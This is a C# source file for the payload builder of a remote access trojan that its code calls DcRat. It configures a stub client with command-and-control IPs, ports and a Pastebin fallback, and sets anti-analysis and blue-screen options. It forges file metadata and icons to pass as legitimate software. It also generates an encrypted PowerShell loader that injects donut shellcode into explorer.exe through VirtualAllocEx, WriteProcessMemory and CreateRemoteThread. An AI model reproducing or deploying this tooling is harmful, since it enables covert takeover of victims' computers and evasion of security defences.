using System;
using System.Windows.Forms;
using Server.Helper;
using System.Text;
using System.Security.Cryptography;
using Server.Algorithm;
using System.Security.Cryptography.X509Certificates;
using System.Collections.Generic;
using Vestris.ResourceLib;
using dnlib.DotNet;
using System.IO;
using System.Linq;
using dnlib.DotNet.Emit;
using System.Threading.Tasks;
using System.Diagnostics;
using Toolbelt.Drawing;
using DarkModeForms;

namespace Server.Forms
{
    public partial class FormBuilder : Form
    {
        private DarkModeCS dm = null;
        public FormBuilder()
        {
            InitializeComponent();
            dm = new DarkModeCS(this)
            {
                ColorMode = DarkModeCS.DisplayMode.DarkMode
            };
        }

        private void SaveSettings()
        {
            try
            {
                List<string> Pstring = new List<string>();
                foreach (string port in listBoxPort.Items)
                {
                    Pstring.Add(port);
                }
                Properties.Settings.Default.Ports = string.Join(",", Pstring);

                List<string> IPstring = new List<string>();
                foreach (string ip in listBoxIP.Items)
                {
                    IPstring.Add(ip);
                }
                Properties.Settings.Default.IP = string.Join(",", IPstring);

                Properties.Settings.Default.Save();
            }
            catch { }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                checkBox1.Text = "ON";
                textFilename.Enabled = true;
                comboBoxFolder.Enabled = true;
            }
            else
            {
                checkBox1.Text = "OFF";
                textFilename.Enabled = false;
                comboBoxFolder.Enabled = false;
            }
        }

        private void Builder_Load(object sender, EventArgs e)
        {
            comboBoxFolder.SelectedIndex = 0;
            if (Properties.Settings.Default.IP.Length == 0)
                listBoxIP.Items.Add("127.0.0.1");

            if (Properties.Settings.Default.Paste_bin.Length == 0)
                txtPaste_bin.Text = "https://Pastebin.com/raw/fevFJe98";

            try
            {
                string[] ports = Properties.Settings.Default.Ports.Split(new[] { "," }, StringSplitOptions.None);
                foreach (string item in ports)
                {
                    if (!string.IsNullOrWhiteSpace(item))
                        listBoxPort.Items.Add(item.Trim());
                }
            }
            catch { }

            try
            {
                string[] ip = Properties.Settings.Default.IP.Split(new[] { "," }, StringSplitOptions.None);
                foreach (string item in ip)
                {
                    if (!string.IsNullOrWhiteSpace(item))
                        listBoxIP.Items.Add(item.Trim());
                }
            }
            catch { }

            if (Properties.Settings.Default.Mutex.Length == 0)
                txtMutex.Text = getRandomCharacters();
        }


        private void CheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (chkPaste_bin.Checked)
            {
                txtPaste_bin.Enabled = true;
                textIP.Enabled = false;
                textPort.Enabled = false;
                listBoxIP.Enabled = false;
                listBoxPort.Enabled = false;
                btnAddIP.Enabled = false;
                btnAddPort.Enabled = false;
                btnRemoveIP.Enabled = false;
                btnRemovePort.Enabled = false;
            }
            else
            {
                txtPaste_bin.Enabled = false;
                textIP.Enabled = true;
                textPort.Enabled = true;
                listBoxIP.Enabled = true;
                listBoxPort.Enabled = true;
                btnAddIP.Enabled = true;
                btnAddPort.Enabled = true;
                btnRemoveIP.Enabled = true;
                btnRemovePort.Enabled = true;
            }
        }

        private void BtnRemovePort_Click(object sender, EventArgs e)
        {
            if (listBoxPort.SelectedItems.Count == 1)
            {
                listBoxPort.Items.Remove(listBoxPort.SelectedItem);
            }
        }

        private void BtnAddPort_Click(object sender, EventArgs e)
        {
            try
            {
                Convert.ToInt32(textPort.Text.Trim());
                foreach (string item in listBoxPort.Items)
                {
                    if (item.Equals(textPort.Text.Trim()))
                        return;
                }
                listBoxPort.Items.Add(textPort.Text.Trim());
                textPort.Clear();
            }
            catch { }
        }

        private void BtnRemoveIP_Click(object sender, EventArgs e)
        {
            if (listBoxIP.SelectedItems.Count == 1)
            {
                listBoxIP.Items.Remove(listBoxIP.SelectedItem);
            }
        }

        private void BtnAddIP_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (string item in listBoxIP.Items)
                {
                    textIP.Text = textIP.Text.Replace(" ", "");
                    if (item.Equals(textIP.Text))
                        return;
                }
                listBoxIP.Items.Add(textIP.Text.Replace(" ", ""));
                textIP.Clear();
            }
            catch { }
        }

        private async void BtnBuild_Click(object sender, EventArgs e)
        {
            if (!chkPaste_bin.Checked && listBoxIP.Items.Count == 0 || listBoxPort.Items.Count == 0) return;

            if (checkBox1.Checked)
            {
                if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
                if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
            }

            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = getRandomCharacters();

            if (chkPaste_bin.Checked && string.IsNullOrWhiteSpace(txtPaste_bin.Text)) return;



            ModuleDefMD asmDef = null;
            try
            {
                using (asmDef = ModuleDefMD.Load(@"Stub/Client.exe"))
                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                {
                    saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                    saveFileDialog1.InitialDirectory = Application.StartupPath;
                    saveFileDialog1.OverwritePrompt = false;
                    saveFileDialog1.FileName = "Client";
                    if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                    {
                        btnShellcode.Enabled = false;
                       
                        WriteSettings(asmDef, saveFileDialog1.FileName);
                        asmDef.Write(saveFileDialog1.FileName);
                        asmDef.Dispose();
                        if (btnAssembly.Checked)
                        {
                            WriteAssembly(saveFileDialog1.FileName);
                        }
                        if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
                        {
                            IconInjector.InjectIcon(saveFileDialog1.FileName, txtIcon.Text);
                        }
                        MessageBox.Show("Done!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        SaveSettings();
                        this.Close();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                asmDef?.Dispose();


            }
        }

        private void WriteAssembly(string filename)
        {
            try
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(filename);

                versionResource.FileVersion = txtFileVersion.Text;
                versionResource.ProductVersion = txtProductVersion.Text;
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["ProductName"] = txtProduct.Text;
                stringFileInfo["FileDescription"] = txtDescription.Text;
                stringFileInfo["CompanyName"] = txtCompany.Text;
                stringFileInfo["LegalCopyright"] = txtCopyright.Text;
                stringFileInfo["LegalTrademarks"] = txtTrademarks.Text;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = txtOriginalFilename.Text;
                stringFileInfo["OriginalFilename"] = txtOriginalFilename.Text;
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;

                versionResource.SaveTo(filename);
            }
            catch (Exception ex)
            {
                throw new ArgumentException("Assembly: " + ex.Message);
            }
        }

        private void BtnAssembly_CheckedChanged(object sender, EventArgs e)
        {
            if (btnAssembly.Checked)
            {
                btnClone.Enabled = true;
                txtProduct.Enabled = true;
                txtDescription.Enabled = true;
                txtCompany.Enabled = true;
                txtCopyright.Enabled = true;
                txtTrademarks.Enabled = true;
                txtOriginalFilename.Enabled = true;
                txtOriginalFilename.Enabled = true;
                txtProductVersion.Enabled = true;
                txtFileVersion.Enabled = true;
            }
            else
            {
                btnClone.Enabled = false;
                txtProduct.Enabled = false;
                txtDescription.Enabled = false;
                txtCompany.Enabled = false;
                txtCopyright.Enabled = false;
                txtTrademarks.Enabled = false;
                txtOriginalFilename.Enabled = false;
                txtOriginalFilename.Enabled = false;
                txtProductVersion.Enabled = false;
                txtFileVersion.Enabled = false;
            }
        }

        private void ChkIcon_CheckedChanged(object sender, EventArgs e)
        {
            if (chkIcon.Checked)
            {
                txtIcon.Enabled = true;
                btnIcon.Enabled = true;
            }
            else
            {
                txtIcon.Enabled = false;
                btnIcon.Enabled = false;
            }
        }

        private void BtnIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Choose Icon";
                ofd.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    if (ofd.FileName.ToLower().EndsWith(".exe"))
                    {
                        string ico = GetIcon(ofd.FileName);
                        txtIcon.Text = ico;
                        picIcon.ImageLocation = ico;
                    }
                    else
                    {
                        txtIcon.Text = ofd.FileName;
                        picIcon.ImageLocation = ofd.FileName;
                    }
                }
            }
        }

        private string GetIcon(string path)
        {
            try
            {
                string tempFile = Path.GetTempFileName() + ".ico";
                using (FileStream fs = new FileStream(tempFile, FileMode.Create))
                {
                    IconExtractor.Extract1stIconTo(path, fs);
                }
                return tempFile;
            }
            catch { }
            return "";
        }

        private void WriteSettings(ModuleDefMD asmDef, string AsmName)
        {
            try
            {
                var key = Methods.GetRandomString(32);
                var aes = new Aes256(key);
                var caCertificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
                var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert));
                byte[] signature;
                using (var csp = (RSACryptoServiceProvider)caCertificate.PrivateKey)
                {
                    var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
                    signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
                }

                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (type.Name == "Settings")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "%Ports%")
                                    {
                                        if (chkPaste_bin.Enabled && chkPaste_bin.Checked)
                                        {
                                            method.Body.Instructions[i].Operand = aes.Encrypt("null");
                                        }
                                        else
                                        {
                                            List<string> LString = new List<string>();
                                            foreach (string port in listBoxPort.Items)
                                            {
                                                LString.Add(port);
                                            }
                                            method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", LString));
                                        }
                                    }

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Hosts%")
                                    {
                                        if (chkPaste_bin.Enabled && chkPaste_bin.Checked)
                                        {
                                            method.Body.Instructions[i].Operand = aes.Encrypt("null");
                                        }
                                        else
                                        {
                                            List<string> LString = new List<string>();
                                            foreach (string ip in listBoxIP.Items)
                                            {
                                                LString.Add(ip);
                                            }
                                            method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", LString));
                                        }
                                    }

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Install%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(checkBox1.Checked.ToString().ToLower());

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Folder%")
                                        method.Body.Instructions[i].Operand = comboBoxFolder.Text;


                                    if (method.Body.Instructions[i].Operand.ToString() == "%File%")
                                        method.Body.Instructions[i].Operand = textFilename.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Version%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("DcRat ", ""));

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Key%")
                                        method.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(key));

                                    if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(txtMutex.Text);

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Anti%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(chkAnti.Checked.ToString().ToLower());

                                    if (method.Body.Instructions[i].Operand.ToString() == "%AntiProcess%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(chkAntiProcess.Checked.ToString().ToLower());

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Certificate%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));

                                    if (method.Body.Instructions[i].Operand.ToString() == "%BSOD%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(chkBsod.Checked.ToString().ToLower());

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Paste_bin%")
                                        if (chkPaste_bin.Checked)
                                            method.Body.Instructions[i].Operand = aes.Encrypt(txtPaste_bin.Text);
                                        else
                                            method.Body.Instructions[i].Operand = aes.Encrypt("null");

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Delay%")
                                        method.Body.Instructions[i].Operand = numDelay.Value.ToString();

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Group%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(txtGroup.Text);
                                }
                            }
                        }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings: " + ex.Message);
            }
        }


        private readonly Random random = new Random();
        const string alphabet = "asdfghjklqwertyuiopmnbvcxz";

        public string getRandomCharacters()
        {
            var sb = new StringBuilder();
            for (int i = 1; i <= new Random().Next(10, 20); i++)
            {
                var randomCharacterPosition = random.Next(0, alphabet.Length);
                sb.Append(alphabet[randomCharacterPosition]);
            }
            return sb.ToString();
        }

        private void BtnClone_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var fileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);

                    txtOriginalFilename.Text = fileVersionInfo.InternalName ?? string.Empty;
                    txtDescription.Text = fileVersionInfo.FileDescription ?? string.Empty;
                    txtCompany.Text = fileVersionInfo.CompanyName ?? string.Empty;
                    txtProduct.Text = fileVersionInfo.ProductName ?? string.Empty;
                    txtCopyright.Text = fileVersionInfo.LegalCopyright ?? string.Empty;
                    txtTrademarks.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;

                    var version = fileVersionInfo.FileMajorPart;
                    txtFileVersion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                    txtProductVersion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                }
            }
        }
        private void btnShellcode_Click(object sender, EventArgs e)
        {
            
            if (!chkPaste_bin.Checked)
            {
                if (listBoxIP.Items.Count == 0 || listBoxPort.Items.Count == 0)
                {
                    MessageBox.Show("IP or Port list is empty.", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                
                foreach (string port in listBoxPort.Items)
                {
                    if (!int.TryParse(port.Trim(), out int portNumber) || portNumber < 1 || portNumber > 65535)
                    {
                        MessageBox.Show($"Invalid port: {port}. Ports must be numbers between 1 and 65535.", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                }

                
                foreach (string ip in listBoxIP.Items)
                {
                    if (!System.Net.IPAddress.TryParse(ip.Trim(), out _))
                    {
                        MessageBox.Show($"Invalid IP address: {ip}.", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                }
            }

            if (checkBox1.Checked)
            {
                if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text))
                {
                    MessageBox.Show("Filename or folder is empty.", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                if (!textFilename.Text.EndsWith(".exe"))
                {
                    textFilename.Text += ".exe";
                }
            }

            if (string.IsNullOrWhiteSpace(txtMutex.Text))
            {
                txtMutex.Text = getRandomCharacters();
                if (string.IsNullOrWhiteSpace(txtMutex.Text))
                {
                    MessageBox.Show("Failed to generate mutex.", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
            }

            if (chkPaste_bin.Checked && string.IsNullOrWhiteSpace(txtPaste_bin.Text))
            {
                MessageBox.Show("Pastebin URL is empty.", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            ModuleDefMD asmDef = null;
          
            try
            {
                

                using (asmDef = ModuleDefMD.Load(@"Stub/Client.exe"))
                {
                    string tempPath = Path.Combine(Application.StartupPath, @"Stub\tempClient.exe");
                    if (!File.Exists(Path.Combine(Application.StartupPath, @"Stub\Client.exe")))
                    {
                        throw new FileNotFoundException("Stub/Client.exe not found.");
                    }
                    if (File.Exists(tempPath))
                    {
                        File.Delete(tempPath);
                    }

                    File.Copy(Path.Combine(Application.StartupPath, @"Stub\Client.exe"), tempPath);
                    

                    btnShellcode.Enabled = false;
                    
                    WriteSettings(asmDef, tempPath);
                    asmDef.Write(tempPath);
                    asmDef.Dispose();
                  

                    if (btnAssembly.Checked)
                    {
                        WriteAssembly(tempPath);
                        
                    }
                    if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
                    {
                        if (!File.Exists(txtIcon.Text))
                        {
                            throw new FileNotFoundException($"Icon file not found: {txtIcon.Text}");
                        }
                        IconInjector.InjectIcon(tempPath, txtIcon.Text);
                        
                    }

                    string savePath = "";
                    using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                    {
                        saveFileDialog1.Filter = "PowerShell Script (*.ps1)|*.ps1";
                        saveFileDialog1.InitialDirectory = Application.StartupPath;
                        saveFileDialog1.OverwritePrompt = false;
                        saveFileDialog1.FileName = "Client";
                        if (saveFileDialog1.ShowDialog() != DialogResult.OK)
                        {
                            throw new Exception("No file selected for saving the PowerShell script.");
                        }
                        savePath = saveFileDialog1.FileName;
                    }

                    string donutPath = Path.Combine(Application.StartupPath, @"Plugins\donut.exe");
                    if (!File.Exists(donutPath))
                    {
                        File.WriteAllBytes(donutPath, Properties.Resources.donut);
                       
                    }
                    if (!File.Exists(donutPath))
                    {
                        throw new FileNotFoundException($"Failed to create donut.exe at {donutPath}");
                    }

                    string tempShellcodePath = Path.Combine(Application.StartupPath, @"Stub\tempShellcode.bin");
                    Process process = new Process();
                    process.StartInfo.FileName = donutPath;
                    process.StartInfo.Arguments = $"-f \"{tempPath}\" -o \"{tempShellcodePath}\"";
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                   

                    bool started = process.Start();
                    if (!started)
                    {
                        throw new InvalidOperationException("Failed to start donut.exe process.");
                    }

                    string stdOutput = process.StandardOutput.ReadToEnd();
                    string errorOutput = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    int exitCode = process.ExitCode;
                    process.Close();
                   

                    if (exitCode != 0)
                    {
                        throw new Exception($"Donut shellcode generation failed with exit code {exitCode}. Error: {errorOutput}\nOutput: {stdOutput}");
                    }

                    if (!File.Exists(tempShellcodePath))
                    {
                        throw new FileNotFoundException($"Failed to generate shellcode: {tempShellcodePath} not found.");
                    }

                    
                    byte[] shellcode;
                    try
                    {
                        shellcode = File.ReadAllBytes(tempShellcodePath);
                      
                    }
                    catch (Exception ex)
                    {
                        throw new Exception($"Failed to read shellcode from {tempShellcodePath}: {ex.Message}");
                    }

                    if (shellcode.Length == 0)
                    {
                        throw new Exception("Generated shellcode is empty.");
                    }

                   
                    byte[] key;
                    byte[] iv;
                    byte[] encryptedShellcode;
                    try
                    {
                        using (Aes aes = Aes.Create())
                        {
                            aes.GenerateKey();
                            aes.GenerateIV();
                            key = aes.Key; 
                            iv = aes.IV;   
                           

                            
                            aes.Mode = CipherMode.CBC;
                            aes.Padding = PaddingMode.PKCS7;
                            using (var ms = new MemoryStream())
                            {
                                using (var cs = new CryptoStream(ms, aes.CreateEncryptor(aes.Key, aes.IV), CryptoStreamMode.Write))
                                {
                                    cs.Write(shellcode, 0, shellcode.Length);
                                }
                                encryptedShellcode = ms.ToArray();
                            }
                           
                        }
                    }
                    catch (Exception ex)
                    {
                        throw new Exception($"Shellcode encryption failed: {ex.Message}");
                    }

                   
                    string keyArray, ivArray, shellcodeArray;
                    try
                    {

                        keyArray = string.Join(",", key.Select(b => b.ToString("D", System.Globalization.CultureInfo.InvariantCulture)));
                        ivArray = string.Join(",", iv.Select(b => b.ToString("D", System.Globalization.CultureInfo.InvariantCulture)));
                        shellcodeArray = string.Join(",", encryptedShellcode.Select(b => b.ToString("D", System.Globalization.CultureInfo.InvariantCulture)));


                       
                        if (!IsValidByteArrayString(keyArray))
                            throw new FormatException($"Invalid format in keyArray: {keyArray.Substring(0, Math.Min(50, keyArray.Length))}...");
                        if (!IsValidByteArrayString(ivArray))
                            throw new FormatException($"Invalid format in ivArray: {ivArray.Substring(0, Math.Min(50, ivArray.Length))}...");
                        if (!IsValidByteArrayString(shellcodeArray))
                            throw new FormatException($"Invalid format in shellcodeArray: {shellcodeArray.Substring(0, Math.Min(50, shellcodeArray.Length))}...");
                    }



                    catch (Exception ex)
                    {
                        throw new Exception($"Byte array formatting failed: {ex.Message}\nStack Trace: {ex.StackTrace}");
                    }

                    
                    string powerShellScript = @"
Add-Type -AssemblyName System.Security
$key = [Byte[]]({0})
$iv = [Byte[]]({1})
$encrypted = [Byte[]]({2})
$cipher = [System.Security.Cryptography.Aes]::Create()
$cipher.Mode = [System.Security.Cryptography.CipherMode]::CBC
$cipher.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$cipher.Key = $key
$cipher.IV = $iv
$decryptor = $cipher.CreateDecryptor()
$decrypted = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
$p = (Get-Process explorer -ErrorAction SilentlyContinue)[0].Id
if ($p -eq $null) {
    Write-Error 'Explorer process not found.'
    exit
}
$code = @'
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport(""kernel32"")] public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport(""kernel32"")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
    [DllImport(""kernel32"")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, UInt32 size, IntPtr lpNumberOfBytesWritten);
    [DllImport(""kernel32"")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThreadId);
}
'@
Add-Type -TypeDefinition $code
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$PAGE_EXECUTE_READWRITE = 0x40
$hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $p)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Error 'Failed to open process.'
    exit
}
$addr = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $decrypted.Length, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
if ($addr -eq [IntPtr]::Zero) {
    Write-Error 'Failed to allocate memory.'
    exit
}
[Win32]::WriteProcessMemory($hProcess, $addr, $decrypted, $decrypted.Length, [IntPtr]::Zero)
[Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
";

                    string finalScript;
                    try{
                        
                        finalScript = powerShellScript
                            .Replace("{0}", keyArray)
                            .Replace("{1}", ivArray)
                            .Replace("{2}", shellcodeArray);
                        
                    }
                    catch (Exception ex){
                        
                        throw new Exception($"Failed to embed arrays in PowerShell script: {ex.Message}");
                    }

                   
                    try{
                        File.WriteAllText(savePath, finalScript);
                        
                    }
                    catch (Exception ex)
                    {
                        throw new Exception($"Failed to save PowerShell script to {savePath}: {ex.Message}");
                    }
                    try{
                        File.Delete(tempShellcodePath);
                        
                        File.Delete(tempPath);
                        File.Delete(donutPath);
                        
                    }
                    catch (Exception ex) {
                       
                    }

                    MessageBox.Show("PowerShell script generated successfully!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    SaveSettings();
                    this.Close();
                }
            }
            catch (FormatException ex){
               
                MessageBox.Show($"Format error: {ex.Message}\nStack Trace: {ex.StackTrace}", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                asmDef?.Dispose();
                btnShellcode.Enabled = true;
                
            }
            catch (Exception ex){
                
                MessageBox.Show($"Error: {ex.Message}\nStack Trace: {ex.StackTrace}", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                asmDef?.Dispose();
                btnShellcode.Enabled = true;
                
            }
        }
        private bool IsValidByteArrayString(string arrayString){
            if (string.IsNullOrWhiteSpace(arrayString))
                return false;

            string[] values = arrayString.Split(',');
            foreach (string value in values){
                if (!int.TryParse(value.Trim(), out int byteValue) || byteValue < 0 || byteValue > 255){
                    return false;
                }
            }
            return true;
        }
    }

}